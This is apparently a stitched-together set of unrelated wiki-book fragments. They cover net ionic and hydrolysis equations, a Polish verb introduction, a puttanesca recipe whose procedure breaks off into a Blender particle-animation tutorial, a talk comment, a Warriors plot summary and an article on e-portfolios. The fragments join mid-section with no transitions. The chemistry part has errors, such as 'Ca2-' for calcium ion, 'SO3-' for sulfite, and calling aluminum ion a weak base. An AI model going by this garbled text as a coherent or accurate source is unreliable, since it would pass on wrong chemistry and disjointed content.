{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{SO}_2 + \hbox{H}_2\hbox{O} \to \hbox{H}_2\hbox{SO}_3&lt;/math&gt;
| First, determine the reaction of the anhydride with water.
|-
| &lt;math&gt;\hbox{H}_2\hbox{SO}_3 + \hbox{Ca}(\hbox{OH})_2 \to \hbox{CaSO}_3 + 2\hbox{H}_2\hbox{O}&lt;/math&gt;
| Then, determine the reaction of the acid and base.  This is a double replacement reaction.
|-
|&lt;math&gt;\hbox{SO}_2 + \hbox{H}_2\hbox{O} + \hbox{H}_2\hbox{SO}_3 + \hbox{Ca}(\hbox{OH})_2  \to \hbox{H}_2\hbox{SO}_3 + \hbox{CaSO}_3 + 2\hbox{H}_2\hbox{O}&lt;/math&gt;
| Add the two reactions together.
|-
|&lt;math&gt;\hbox{SO}_2 + \hbox{Ca}^{2-} + 2\hbox{OH}^- \to \hbox{CaSO}_3 + \hbox{H}_2\hbox{O}&lt;/math&gt;
| Cancel out spectators.  Also, calcium hydroxide should be ionized (but calcium sulfite is a solid precipitate).  This is the final ''net ionic equation''.
|}

Here are more examples.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{CaO} + 2\hbox{H}^+ \to \hbox{H}_2\hbox{O} + \hbox{Ca}^{2+}&lt;/math&gt;
| Calcium oxide crystals (basic anhydrides) are added to a strong acid.  Notice that it does not matter what the acid is (nitric, sulfuric, etc.) because it is strong and this reaction only requires the hydrogen ions.  In other words, the anions of the strong acid are spectators and are not written.
|-
| &lt;math&gt;\hbox{SO}_2 + \hbox{OH}^- \to \hbox{HSO}_3^-&lt;/math&gt;
| Excess sulfur dioxide gas is bubbled into a dilute solution of strong base.  The base is the limiting reactant.
|-
| &lt;math&gt;\hbox{SO}_2 + 2\hbox{OH}^- \to \hbox{H}_2\hbox{O} + \hbox{SO}_3^-&lt;/math&gt;
| Sulfur dioxide gas is bubbled into an excess of basic solution.
|}

Remember that water is involved in these reactions, but it not written if it occurs on both sides of the equation.

{{Info|Anhydrides can undergo neutralization reactions, even without the presence of water.}}

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{CaO} + \hbox{CO}_2 \to \hbox{CaCO}_3&lt;/math&gt;
| Solid calcium oxide (basic anhydride) is exposed to dry ice gas (acidic anhydride).  The resulting solid is a salt.
|-
| &lt;math&gt;\hbox{CaO} + \hbox{SO}_3 \to \hbox{CaSO}_4&lt;/math&gt;
| Solid calcium oxide is exposed to a stream of sulfur trioxde gas.  The resulting solid is a neutral salt.
|}

== Hydrolysis ==

A salt of a weak acid and strong base dissociates and reacts in water to form OH&lt;sup&gt;-&lt;/sup&gt;.  A salt of a strong acid and weak base dissociates and reacts in water to form H&lt;sup&gt;+&lt;/sup&gt;.  This process is called ''hydrolysis''.

In this first example, aluminum nitrate is dissolved in water.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{Al}(\hbox{NO}_3)_3 + \hbox{H}_2\hbox{O} \to \hbox{Al}^{3+} + 3\hbox{NO}_3^- + \hbox{H}_2\hbox{O}&lt;/math&gt;
| First, the salt dissociates in the water.  It isn't necessary to write H&lt;sub&gt;2&lt;/sub&gt;O in this reaction.
|-
| &lt;math&gt;\hbox{Al}^{3+} + \hbox{H}_2\hbox{O} \to \hbox{Al}(\hbox{OH})^{2+} + \hbox{H}^+&lt;/math&gt;
| Now, at least one of the ions will react with water.  You know that nitric acid is strong, so the nitrate ion will not take an H&lt;sup&gt;+&lt;/sup&gt; ion from water.  Instead, the aluminum ion will react with water, releasing a hydrogen ion.
|-
| &lt;math&gt;\hbox{Al}(\hbox{NO}_3)_3 + \hbox{H}_2\hbox{O} \to \hbox{Al}(\hbox{OH})^{2+} + \hbox{H}^+ + 3\hbox{NO}_3^- &lt;/math&gt;
| This is the ''net ionic equation''.  The resulting solution is acidic.
|}

The solution is acidic not because nitric acid is strong, but because aluminum is a weak base.

Here is an easier example.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{NaNO}_2 + \hbox{H}_2\hbox{O} \to \hbox{Na}^+ + \hbox{NO}_2^- + \hbox{H}_2\hbox{O}&lt;/math&gt;
| First, the salt dissociates.  Again, the H&lt;sub&gt;2&lt;/sub&gt;O need not be written.
|-
| &lt;math&gt;\hbox{NO}_2^- + \hbox{H}_2\hbox{O} \to \hbox{HNO}_2 + \hbox{OH}^-&lt;/math&gt;
| Sodium ions will not react with water.  Even if they did, they would form NaOH, which is a strong base, so it would immediately dissociate.  Instead, the NO&lt;sub&gt;2&lt;/sub&gt; reacts with water.  Being the conjugate of a weak acid, the nitrite ions will accept a proton from water to form nitrous acid (weak) and hydroxide ions (basic).
|-
| &lt;math&gt;\hbox{NaNO}_2 + \hbox{H}_2\hbox{O} \to \hbox{Na}^+ + \hbox{HNO}_2 + \hbox{OH}^-&lt;/math&gt;
| This is the net ionic equation for the hydrolysis of sodium nitrite.  The resulting solution is basic.
|}

{{Info|There is no hydrolysis reaction for ''neutral salts''.  Salts like NaCl and K&lt;sub&gt;2&lt;/sub&gt;SO&lt;sub&gt;4&lt;/sub&gt; (and any other composed of the conjugates of both a strong acid and strong base) will not react with water.  They create neutral solutions when dissolved.}}

== Lewis Acids/Bases ==

Lewis acids accept an electron pair.  Lewis bases donate an electron pair.  Together they react and bond to form an ''adduct''.

Lewis acids/bases do not require the presence of water.  However, H&lt;sup&gt;+&lt;/sup&gt; can be though of as a Lewis acid because it accepts electron pairs.  OH&lt;sup&gt;-&lt;/sup&gt; can donate an electron pair, making it a Lewis base.

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;\hbox{BF}_3 + \ddot{\hbox{N}}\hbox{H}_3 \to \hbox{F}_3\hbox{B}-\hbox{NH}_3&lt;/math&gt;
| Boron trifluoride (Lewis acid) is exposed to ammonia (a Lewis base, as shown by the electron pair over the N).  The electron pair is shared between the nitrogen and boron, creating a bond. (The boron trifluoride is written backwards as F&lt;sub&gt;3&lt;/sub&gt;B only to demonstrate the B-N bond. Its structure has not changed.)
|-
| &lt;math&gt;\hbox{B}_2\hbox{H}_6 + 2\hbox{H}^- \to 2\hbox{BH}_4^-&lt;/math&gt;
| Diborane accepts the two electrons from H&lt;sup&gt;-&lt;/sup&gt; and forms a Lewis adduct.
|}

== Practice Problems ==
Write the net ionic equations for the following.  Make note of any solid precipitates or gas bubbles that would form.

# Equimolar solutions of sodium biphosphate and potassium hydroxide are mixed.
# Equimolar solutions of sodium biphosphate and hydrochloric acid are mixed.
# Excess sulfur dioxide gas is bubbled into a dilute solution of sodium hydroxide.  Acid is then added.
# Aluminum chloride is dissolved into water.
# Sodium fluoride is dissolved into water.  Strong acid is then added.
# Solid calcium oxide is exposed to a stream of sulfur trioxide gas.  If the resulting compound is dissolved, will the solution be acidic, basic, or neutral?
# Gaseous hydrogen chloride is bubbled into a solution of silver nitrate.
# Ammonium chloride crystals are dissolved in water.  Sodium hydroxide is then added.
# Calcium hydroxide crystals are dissolved into a solution of sodium bicarbonate.
# Phosphine gas is sprayed onto pebbles of aluminum trichloride. (Hint: these are Lewis acids/bases.)

      <text xml:space="preserve">There are many irregular and semi-irregular Polish verbs, but among the others, we can find some regularities - and we can divide them into four categories.

NOTE: The first example in each table is a perfective verb (when the action is complete), while the second one is an imperfective one (the action is in progress); the endings are the same, but the imperfective verbs have an extra syllable added between the verb root and the conjugated verb ending, as shown below.

'''''Spaghetti alla puttanesca''''' (Italian: &quot;whore's spaghetti&quot;) is a spicy, tangy and somewhat salty [[wikipedia:Italian cuisine|Italian]] [[cookbook:pasta|pasta]] dish. Italians refer to the sauce as ''sugo alla puttanesca''.

The earliest reference to  ''spaghetti alla puttanesca'' in print, cited by the ''Grande dizionario della lingua italiana'', occurred in Raffaele La Capria’s 1961 novel ''Ferito a morte''. Also, Italy's Professional Association of Pasta Makers agrees the sauce became popular in the 1960s.&lt;ref&gt;[http://www.unipi-pasta.it/PASTADAY/CART2006/art1.htm Unione Industriali Pastai Italiani]&lt;/ref&gt;
==Origin==
According to Annarita Cuomo, writer for ''Il Golfo'', a newspaper serving the Italian islands of [[wikipedia:Ischia|Ischia]] and [[wikipedia:Procida|Procida]], ''sugo alla puttanesca'' was invented in the 1950s by Sandro Petti, co-owner of ''Rancio Fellone'', a famous Ischian restaurant and nightspot.&lt;ref&gt;[http://www.ilgolfo.it/t/storehtm/htm19/17Feb0501f Annarita Cuomo's story on the origin of ''spaghetti alla puttanesca'']&lt;/ref&gt;

The moment of inspiration came, writes Cuomo, when near closing one evening Petti found a group of hungry friends sitting at one of his tables. Petti was low on ingredients and told them he didn't have enough to make them a meal. They complained that it was late and they were hungry. &quot;''Facci una puttanata qualsiasi''&quot; (“make any kind of garbage”), they insisted. In this usage, ''puttanata'' is a noun meaning garbage or something worthless. It is also derived from the Italian word ''puttana'', meaning whore.

Petti had nothing more than four tomatoes, two olives and some [[wikipedia:caper|capers]]; the basic ingredients for the ''sugo''. “So I used them to make the sauce for the spaghetti,” Petti told Cuomo.

Later, Petti included the dish on his menu as ''spaghetti alla puttanesca''.

==Cooking with chili peppers==
This recipe calls for chili peppers. Choosing the right quantity and type of pepper depends on your personal taste and a bit of trial and error. For this dish, most chefs use peppers in the moderate range of the [[wikipedia:Scoville scale#List_of_Scoville_ratings|Scoville scale]]. Use one or one and a half small peppers the first time you make this recipe. Use one and a half or two small peppers if your first attempt at making ''sugo'' leaves you craving more pepper heat. Keep increasing the number of peppers until you get it right. Most chefs stop at three.

==Recipes==
Ingredients vary a bit among chefs and cooks according to individual tastes. However, the version from [[wikipedia:Lazio|Lazio]] always includes [[wikipedia:anchovy|anchovies]] while the Neapolitan version never does.&lt;ref&gt;[http://www.portanapoli.com/Ita/Cucina/ga_puttanesca.html Neapolitan recipe for ''spaghetti alla puttanesca'' on ''Portonapoli'']&lt;/ref&gt;&lt;ref&gt;[http://www.accademiaitalianacucina.it/ricetta.php?id=889 Recipe on the site for the ''Accademia Italiana della Cucina'']&lt;/ref&gt;

An Italian-American version of this dish has emerged that omits butter and oregano but includes onions, anchovies and chili peppers.&lt;ref&gt;[http://www.mediterrasian.com/delicious_recipes_pasta_puta.htm ''Pasta puttanesca'' recipe on Mediterrasian.com]&lt;/ref&gt; Also, Americans tend to call the Italian-American version ''pasta puttanesca'' rather than ''spaghetti alla puttanesca''.

Finally, both recipes below contain very little protein. However, shrimp and scallops [[wikipedia:sautéd|sautéd]] in olive oil go beautifully with this dish. If you can't eat shellfish then add [[w:Tuna#Canned tuna|canned tuna]] or broiled [[cookbook:salmon|salmon]] to the pasta before coating it with ''sugo''.

==Lazio's recipe (serves six to eight)==
===Ingredients===
*600 grams (21 ounces) of spaghetti
*50 grams (1.75 ounces) of butter
*3 tablespoons of extra virgin olive oil
*6 unsalted anchovy fillets, crushed into a paste (omit anchovies for Neapolitan version)
*3 cloves of garlic, finely chopped 
*200 grams (7 ounces) of black olives, pitted and chopped 
*1 tablespoon of salted capers, washed well and coarsly chopped
*1 to 3 small dried chili peppers, chopped (optional)
*600 grams (21 ounces) plum tomatoes, peeled and [[wikipedia:purée|puréed]]
*1 tablespoon of chopped parsley
*salt to taste

===Procedure===
#Put the following in a skillet: butter, olive oil, garlic and anchovy paste.
#Before the garlic browns, add the olives, capers, tomato sauce and chili peppers.
#Add two to three pinches of salt, mixing at high heat.
#Meanwhile, cook the spaghetti in salt water (at least 4 quarts of water per pound of spaghetti being cooked). Strain it when it's [[wikipedia:al dente|''al dente'']]. Place it in a large serving bowl and coat it with sauce. Then sprinkle it with chopped parsley.
#Mix and serve hot.

==Italian-American recipe (serves two)==
===Ingredients===
*3 tablespoons olive oil
*6 ounces (170 grams) onions, finely chopped
*2 cloves garlic, minced
*4 anchovy fillets chopped or 2 teaspoons anchovy paste
*2 teaspoons capers, thoroughly rinsed
*1 to 3 fresh or dried chili peppers, deseeded and finely chopped (See information above on choosing hot peppers.)
*8 large pitted black or kalamata olives, quartered
*14 ounces (400 grams) plum tomatoes, diced 
*salt (1 tablespoon for boiling water, 1 teaspoon for sauce)
*1/4 teaspoon freshly ground black pepper
*1 tablespoon finely chopped parsley
*7 ounces (200 grams) dry spaghetti or linguine

===Procedure===

{{B3D:N2P/ForVersion|2.48a}}

&lt;table&gt;
&lt;tr valign=&quot;top&quot;&gt;
&lt;td&gt;[[File:Blender3D ParticlesShapingObjects-2.48a.ogv|none|thumb|400px|'''Image 1a:''' Particles can move to the position of other particles with ''Keyed'' physics.]]&lt;/td&gt;
&lt;td&gt;[[File:Blender3D TransientTextHarmonicFields.ogg|none|thumb|400px|'''Image 1b:''' Particles can react to force fields of other particles.]]&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

I will show on this page two ways to let particles take the shape of other objects.
# keyed particle physics ('''Img.&amp;nbsp;1a''')
# a harmonic force field with a damping of 1. The force field is emitted by another particle system, so that each particle is attracted by another particle ('''Img.&amp;nbsp;1b'''). 

;v2.48: The second method is easier to control, but I've found that it may not work exact enough. Even if you use RK4 as calculation method, there are some glitches in the precision of the calculation, so that your particles may not come to a standstill (depending on the size of the particles and their number this may be visible or not). 
;v2.49: That the particles didn't come to a standstill has been a bug that Jahka has fixed in 2.49. So if you use Version 2.49 and upwards you will find it easier to work with the harmonic force field.

{{B3D:N2P/Note|'''Plan Ahead!'''

Make it easy for yourself. If you know beforehand what will happen at each important frame, you will save a lot of time fiddling with the parameters.}}

{{clr}}
== Keyed Physics ==
So here we're going to use keyed particle physics and quite a few different particle systems.

Basically this is the way to go:

* Use mesh objects and let them emit particles.
* Each system moves to another system because of the keyed physics.
* Choose a good visualization of the particles and animate that also. 
* At last the hard part: sync the different animations. 

The animation shall last 300 frames, this will be 12 seconds. 
:- In the first 2 seconds the word &quot;Blender&quot; shall appear (frame 1 to 50).
:- Than Suzanne shall build up in 3 seconds (frame 51 to 150).
:- Suzanne shall be clearly visible for a few frames (frame 151 to 200).
:- After that the form shall dissolve and the particles move a bit until they vanish (frame 200 to 300)

=== Preparing the scene ===
* Remove the cube.
* Add a text object ''Blender''. Name it ''Blender-first''.
* Add a ''Suzanne'' (''Add-&gt;Mesh-&gt;Monkey'').  Name it ''Suzanne-first''.
* Convert the text object to a meshobject, because only mesh objects can emit particles (menu: ''Object-&gt;Convert Object Type-&gt;Mesh'').
* Move the objects to their final positions, also the camera.
*'''Clarification required - what are the final positions?''' ('''Noob note''': the author probably means to move the camera and objects to a right position for viewing the animation correctly.)

We need every visible object twice. 
* Duplicate ''Blender-first'' and call the duplicate ''Blender-last''.
* Duplicate ''Suzanne-first'' and call the duplicate ''Suzanne-last''.

One problem is that the objects have different sizes. So how many particles shall be used to create a clearly visible form? Since the most difficult object is Suzanne, I have first chosen an acceptable representation and set everything else accordingly. But I will discuss the settings of the objects in order, and not in the way I did it in reality.

=== Set up the particle systems ===
'''Blender-first:'''
* Add a particle system to ''Blender-first''.
** Amount ''20.000''
** ''Sta:'' 1, ''End:'' 50, ''Life:'' 50
* ''Emit from:''
** ''Random/Faces/Even/Random''
 
Leave all other settings at default. This object will appear in the first 50 frames. After that the object has to vanish in the 51th frame. 
* Insert a layer key for ''Blender-first'' in frame 50 (mouse over the 3D window, '''I'''-&gt;''Layer''). 
* Change to frame 51. 
* Move the object to layer 20 ('''M'''-&gt;select layer, bottom right box). Make that layer visible. 
* Insert the next layer key for the object. 
* Make layer 20 invisible again (select layer 1).
* Change back to frame 1.

'''Suzanne-first'''
* Add a particle system.
** Amount ''20.000''
** ''Sta:'' 50, ''End:'' 100, ''Life:'' 200 (we don't need this long life but the lifetime doesn't matter as long as it's long enough)
* ''Emit from:''
** ''Random/Faces/Even/Random''
* ''Visualization: None'' 
Leave all other settings as default. These particles shall not move and they shall not be visible. They are simply a target to the next system. 

* Animate the layer of this object also. Move it out of sight in frame 151. 

'''Blender-last'''

These particles shall move from the shape &quot;Blender&quot; to the &quot;Suzanne&quot; shape.
* Add a particle system to ''Blender-last''.
** Amount ''20.000''
** ''Sta:'' 51, ''End:'' 51, ''Life:'' 100
* ''Emit from:''
** ''Random/Faces/Even/Random''
* Physics: 
** ''First/Keyed'' It is the first system of a chain (a very short chain in this example) of systems.
** ''Keyed Target:'' Suzanne-first, ''Psys:'' 1. Target is the first particle system of &quot;Suzanne-first&quot;.
* Set time to ''Absolute'' in the ''Extras'' panel. We're going to animate the material of the particles, I want all particles to change at once in a certain frame.
[[File:Blender3D FirstKeyedSystem-2.48a.png|framed|none|'''Image 2a:''' Particle system of the first keyed system.]]

'''Suzanne-last'''

These particles shall dissolve the form, so at first they take the shape and move around randomly afterwards.
* Add a particle system to ''Suzanne-last''.
** Amount ''20.000''
** ''Sta:'' 151, ''End:'' 151, ''Life:'' 150, ''Rand:'' 0.5. The lifetime is randomized from 151/2 to 151 frames. [Noob Note: In 2.49a, you can't set the start later than the end, so you must first change the end to 151, then change the start.]
* ''Emit from:''
** ''Random/Faces/Even/Random''
* ''Bake:'' ''End'' frame 300. Though we don't use baking here, you have to set the ''End'' frame in the ''Bake'' panel. Else the last 50 frames wouldn't be calculated.
* ''Time: Absolute''
[[File:Blender3D BrownianMotionAnimation-2.48a.png|framed|'''Image 2b:''' Animation of Brownian Motion]]
Animate the Brownian motion of the particles. 
* Open an ''Ipo'' window.
* Select ''Ipo Type'' particles.
* Select the ''Brown'' channel ('''LMB''').
* '''Ctrl-Click''' with the left mouse button in the ''Ipo'' window to create an Ipo-key for the selected channel.
* Create a curve similar to '''Img.&amp;nbsp;2b'''. '''Brown''' = 0 to frame 200, than increase to '''Brown''' = 4 in frame 217. 

{{clr}}

=== Material ===
Blender-first and Blender-last will get the same material, Suzanne-first is invisible anyway, but Suzanne-last will get a material. The material of the three objects is very similar, but I have animated the visibility of the particles to match the brightness of the objects. 

[[File:Blender3D ParticleMaterialForKeyedSystem-2.48a.png|framed|none|'''Image 2c:''' Material settings for the particles]]
'''Suzanne-last'''&lt;br /&gt;
* Create a simple ''Halo'' material like that in '''Img.&amp;nbsp;2c'''. 
This is nothing special, relatively small particles with a relatively &quot;sharp&quot; edge. The ''Add'' parameter gives more brightness if particles overlap, I think this is a nice effect here.

'''Blender-first'''
* Assign the material also to &quot;Blender-first&quot;.
* Make the material a ''Single User Copy'' by clicking on the small number next to the material name.
* Set ''Alpha'' to 0.438.

'''Blender-last'''
* Assign the &quot;Blender-first&quot; also to ''Blender-last&quot;.
* Make the material a ''Single User Copy'' by clicking on the small number next to the material name.
* Animate the alpha value of the material. 
** Insert an ''Ipo'' key for ''Alpha'' in frame 50. 
** Change to frame 150.
** Set ''Alpha'' to 1.
** Insert an ''Ipo'' key for ''Alpha''.
Now the brightness of all systems are matched.

== Harmonic Force Fields ==
So here we will use ''Harmonic'' force fields. The Text &quot;Blender&quot; shall be transformed to the text &quot;2.5&quot; and than to the text &quot;The big leap forward&quot; ('''Img.&amp;nbsp;1b''').

* Use mesh objects and let them emit particles. Only the particles from the first object are visible and move.
* The other particle systems use an animated ''Harmonic'' force field to attract the particles from the first system. 
* The particles from the first system take the place of the other particles.
* Choose a good visualization of the particles and animate that also. This is difficult and maybe you should animate the visualization at last.
* At last the hard part: sync the different animations and force fields.

=== Preparing the scene ===
* Remove the cube.
* Add three text objects:
** &quot;Blender&quot;
** &quot;2.5&quot;
** &quot;The big leap forward&quot;
* Convert the text objects to mesh objects (menu: ''Object-&gt;Convert Object Type-&gt;Mesh''). 

=== Set up the particle systems ===
* Give each of the three objects its own particle system. 
* The first object &quot;Blender&quot; gets following system:
** Type ''Emitter''
** ''Amount''=4000. We need a lot of particles, to fill the last text evenly. If you want to make the animation even better, you could animate the ''Halo'' size of the particles to match the density of the different objects. 
** ''Sta(rt)''=1, ''End''=10, ''Life''=250. The particles are created from the first to the 10th frame and live for 250 frames.
Only the particles of this system will be visible later.
* Change the calculation method from ''Midpoint'' to ''RK4''. We need the extra precision here.

The objects &quot;2.5&quot; and &quot;The big leap forward&quot; will get particle systems with very similar settings:
* &quot;2.5&quot;:
** Type ''Emitter''
** ''Amount''=4000
** ''Sta(rt)''=30, ''End''=30, ''Life''=70. So all the particles are emitted in frame 30 and live 70 frames. So their force field (which we give them soon) will start in frame 30 also. If you want a smoother transition you should give the particles a bit more time to be emitted (like from frame 30 to frame 40).
** Emit from ''Random''/''Faces''/''Even''/''Random''. 
** Phyics ''None''. The target particles shall not move.
** Visualisation ''None''. The target particles are not rendered.
* &quot;The big leap forward&quot;: All settings as for &quot;2.5&quot;, except ''Sta'', ''End'' and ''Life''.
** ''Sta''=101, ''End''=101, ''Life''=90. 

=== The force fields ===
[[Image:Blender3D HarmonicFieldParticlesNoObject.png|framed|'''Image 3a:''' The object does not get a force field.]]
The '''particle systems''' of the objects &quot;2.5&quot; and &quot;The big leap forward&quot; will get a force field now. The objects '''don't''' get a force field.
* Select the object &quot;2.5&quot;.
* Select the particle system in the ''Field'' panel of the ''Physics'' buttons ('''Img.&amp;nbsp;3a''').
[[Image:Blender3D HarmonicFieldOnParticles.png|framed|'''Image 3b:''' The particle system gets the force field.]]
* Use field type ''Harmonic''. Now the particles from the object &quot;2.5&quot; do attract the particles from the object &quot;Blender&quot;. 
* The ''Strength'' of the force field determines the time the particles need to reach the target. Set it accordingly.
* The ''Damp''(ing) makes sure, that the particles move to their target but not beyond. 

Do the same for the object &quot;The big leap ...&quot;, i.e. select the particle system and give it a ''Harmonic'' force field.


I have used a ''Wind'' field in the last frames to blow the particles away.

(Noobie Warning: When i followed the tutorials up to this point, i didn't know how to use wind. I thought selecting ''Wind'' instead of ''Harmonic'' would create the effect but then blender froze on me (I am guessing it went away and calculated wind for every single particle). so don't try wind yet.  Wind is instructed in later tutorials.)

      <text xml:space="preserve">For the concentration problem, I think there is a logical error somewhere. 
The solution given:

a) doesn't give the concentration at time t, like the question was looking for, 

b) Has a problem when the R&lt;sub&gt;o&lt;/sub&gt; is R&lt;sub&gt;i&lt;/sub&gt;. Logically, the volume would stay at V&lt;sub&gt;0&lt;/sub&gt;, while the concentration of the solution leaving would approach the concentration going out. The solution here doesn't seem to act this way.</text>

==Detailed Plot Summary==
In the prologue, a Clan of cats called ThunderClan is battling against a rival Clan, RiverClan, at a place the cats call Sunningrocks. A cat named Redtail, ThunderClan's deputy, soon realizes that ThunderClan is so outnumbered that they have to retreat. Later, Spottedleaf, the medicine cat of ThunderClan, receives a prophecy from StarClan, the cats' &quot;heaven&quot;, stating to Bluestar, ThunderClan's leader, that &quot;Fire alone can save our Clan.&quot;.

Into The Wild  takes place in the western Great Plains. It starts out with a &quot;kittypet&quot; (Clan cats' name for housecats) named Rusty. Rusty is wandering off into the woods when he is stumbled upon by a feral cat named Graypaw.  He is a ThunderClan apprentice. Unknown to the two young cats, two warriors from ThunderClan watch them -Lionheart a golden brown tabby male and Graypaw's mentor, and Bluestar, a blue-gray tabby female who leads the Clan. After they watch Rusty and Graypaw fight and make up, Bluestar offers Rusty a chance to join their Clan of feral cats and train as an apprentice. Rusty goes home to think it over, and then meets Lionheart and another ThunderClan cat, named Whitestorm, in the woods. Rusty then tells them that he accepts Bluestar's offer. Rusty then travels to the ThunderClan camp (the cat's home) and fights Longtail (a prejudiced young warrior of ThunderClan). In a battle of honor, and Rusty splits Longtail's ear and Rusty's collar snaps off. This is taken as an omen from the cats' StarClan that Rusty is meant to be in their Clan. Rusty is then given his new Clan name Firepaw, because of the way his flame-colored coat shines in the sunlight. However, Firepaw soon learns that kittypets are thought to be soft and useless to most Clan-born cats and Firepaw is a cat who did not have &quot;warrior blood&quot; in his veins at all but he is slowly able to adjust to his new life.

Firepaw grows up fast and trains hard to become a full, respected warrior and member of the Clan. Firepaw's natural curiosity is also aroused when he finds himself becoming suspicious of the Clan member Tigerclaw when he is appointed deputy of ThunderClan. This was suspicious because the original deputy, Redtail, had been killed in battle by Oakheart (the deputy of RiverClan). A while after Lionheart becomes deputy, Lionheart is killed in battle as well, and then Tigerclaw becomes the new deputy under very unusual circumstances. Ravenpaw, another ThunderClan apprentice and witness to a murder, tells Firepaw that it was Tigerclaw, not Oakheart who actually killed the former ThunderClan deputy, Redtail. But Tigerclaw makes sure that no cat trusts Ravenpaw, giving Firepaw the motive to take Ravenpaw to a different home. Tigerclaw taunts Firepaw on a regular basis, but Firepaw soon grows used to it.

In the midst of this, Spottedleaf, the medicine cat of ThunderClan, is killed in an attack from a merciless death blow by Clawface of ShadowClan, another one of the four Clans in the forest. During this attack, some of the kits from ThunderClan go missing. Tigerclaw immediately blames Yellowfang, the new ThunderClan medicine cat, because she was taken into the Clan from ShadowClan, ThunderClan's enemy. Yellowfang was also not present after the battle, therefore making Tigerclaw and the rest of the Clan suspicious of her. Bluestar intervenes and said that there was no proof that she did anything, and does not blame her for anything. Yellowfang, whom Firepaw found, has grown to become friends after Firepaw had to take care of her as a punishment for disobeying the warrior code. Many cats in ThunderClan distrusted Yellowfang both because of her former Clan, and also because of a warning given at a Gathering (a meeting of the four Clans where they discuss the needs of the Clans). This warning given by Brokenstar, ShadowClan's leader, described Yellowfang whom ShadowClan had driven from their Clan. He warned that no other Clan should take her in and that they should watch their kits closely, because he blamed her for killing the two kits Brokenstar himself had actually killed.
Firepaw is determined to prove Yellowfang innocent of the accusation that she had been stealing kits and rescue the missing kits. Firepaw and Graypaw, determined to prove Yellowfang's innocence, manage to find kits that went missing from the Clan, rescue them from ShadowClan, and drive the real kit snatcher, Brokenstar, from his position as ShadowClan leader. Brokenstar had intended to train the tiny kits early so that he could have more warriors for his Clan; Firepaw's success prevents this from happening. They then drive off Brokenstar. After their adventure, Firepaw and Graypaw are promoted to ThunderClan warriors, and receive warrior names - Fireheart and Graystripe. The story ends as the two new warriors begin their traditional silent vigil until dawn.

So who thinks this is good? It's basically copyed and pasted from the Warriors Wikia.</text>

      <text xml:space="preserve">===Overview===
Portfolios, and electronic portfolios (also known as “e-portfolios or e-folios”) in particular, are fast becoming the ideal way to formatively assess student understanding of concepts in today’s K-12 classroom. Key concepts that need to be defined in order to thoroughly understand this process include portfolios and e-portfolios, along with their relevance to constructivism. After initial investigation of these central ideas, we will look at concrete examples of e-portfolio use in K-12 classrooms.

===Key Concepts===
A portfolio is a collection of artifacts that document student progress toward one or more instructional goals in one or more courses. Elements that are often included in a portfolio include drafts of student work, student self-assessment, parent and/or teacher assessment, finalized written products, photographs of artwork, sewing projects, industrial technology creations, or other hands-on coursework, and recordings of musical or theatrical performances, along with sections dedicated to personal and career goals, educational “paperwork” such as attendance, discipline, and grades, and awards/honors in and outside of school that demonstrate a student’s leadership, character, scholarship, or community service.

Oftentimes, the portfolio consists of a three-ring binder or box that holds the artifacts. An e-portfolio works on the same principles discussed above, except that all items that are selected are organized, summarized, and shared digitally. These can then be viewed online either through an intranet or internet connection, depending on the level of privacy desired by the stakeholders.

Regardless of the contents in the particular portfolio, the student must participate “in selecting contents, the criteria for selection, [and] the criteria for judging merits” (Roach, 2001). Otherwise, the portfolio is just another group of assignments dictated and judged by the teacher, whereby no critical thinking or decision-making rights have been given to the student. It is imperative to make this distinction because the true goal of portfolios fully aligns with constructivist thought when it “involve[s] students in their own education so that they can take charge of their personal collection of work, reflect on what makes some work better, and use this information to make improvements in future work” (OERI, 1993). Students will construct more enduring knowledge when they are the driving force behind the learning and the teacher promotes the process by helping them “collect, select, reflect, and connect” (Epstein, 2009).

'''Collection''' involves determining what academic and non-academic artifacts should be collected, how they are to be collected (scanned, typed, photographed, digitally recorded, etc.), how they will be organized ,and ensuring that students “habitually document and collect their work” (Epstein, 2009).

'''Selection''' takes into account the purpose of the portfolio and the audience to whom it is directed. A question that needs to be address is whether or not the portfolio should contain only the student’s best work or show progress made over a given time period. Will the portfolio be used for grade promotion, graduation, student-led conferences, or as a tool to get a job? Criteria needs to be set as to how often material is selected for the portfolio and which stakeholders besides the student (parent/teacher/administrator/community members) have a say in the contents, and to what degree their say matters.

Critical thinking skills are intrinsically flexed in the process of portfolio development as students reflect upon their selected portfolio pieces in concerted metacognitive exercises (Roach, 1993). '''Reflection''' is essential to “developing and understanding criteria for good efforts, in coming to see the criteria as their own, and in applying the criteria to their own…work.” (OERI, 1993). Students can reflect on how or why they chose particular artifacts, the skills and knowledge needed to produce them, and strengths and weaknesses evident in each of them. Students benefit more when there is attention paid to awareness of the processes and strategies that underlie effective performance. In this way, they can fully learn, understand, and transfer the skill or knowledge to new contexts.

'''Connection''' is the part of the portfolio that can make the process real for many students. Students can demonstrate their proficiencies and learning growth by presenting or exhibiting the portfolio to an authentic audience. E-portfolios lend themselves perfectly to this real-world exhibition because they can be uploaded to a web site or simply browsed on a desktop kiosk. When students know that their work is going to be “published” or viewed by people other than themselves and the teacher, pride of ownership becomes an issue. They want to show their best efforts when they know other students, parents, community members, college admissions officers, and/or possible employers will be looking.

E-portfolio creation serves a variety of purposes, while supporting students’ multiple intelligences and providing a structure to working collaboratively in “socially mediated activities that provide the social and cultural context for the transition from other-directed to self-directed behavior and growth [in their own] strengths, needs, and modes of learning and achieving.” (Roach, 2001). Portfolio assessment shines through its focus on regular, ongoing authentic assessment, artifact selections, teacher-student dialogues, and timely information gleaned from student reflection about their strengths and needs that inform both individual and whole-group instruction.

===Examples===
'''K-5th Grade:''' A very clear, thorough example of portfolio use in an elementary classroom that includes a description of Student Objectives, the Portfolio, Self-Assessment, Self-Reflection, Teacher Response, Points to Keep in Mind, Suggestions for Portfolio Comments, Entry Slips, Writing Inventories, and Parent Communication can be found on Pomperaug Regional School District 15's web site at [ftp://ftp.region15.org/wpoad.pdf]. ''This standard portfolio can easily be made into an e-portfolio by digitizing the contents using a word processing application, a scanner, and a digital camera.''
----
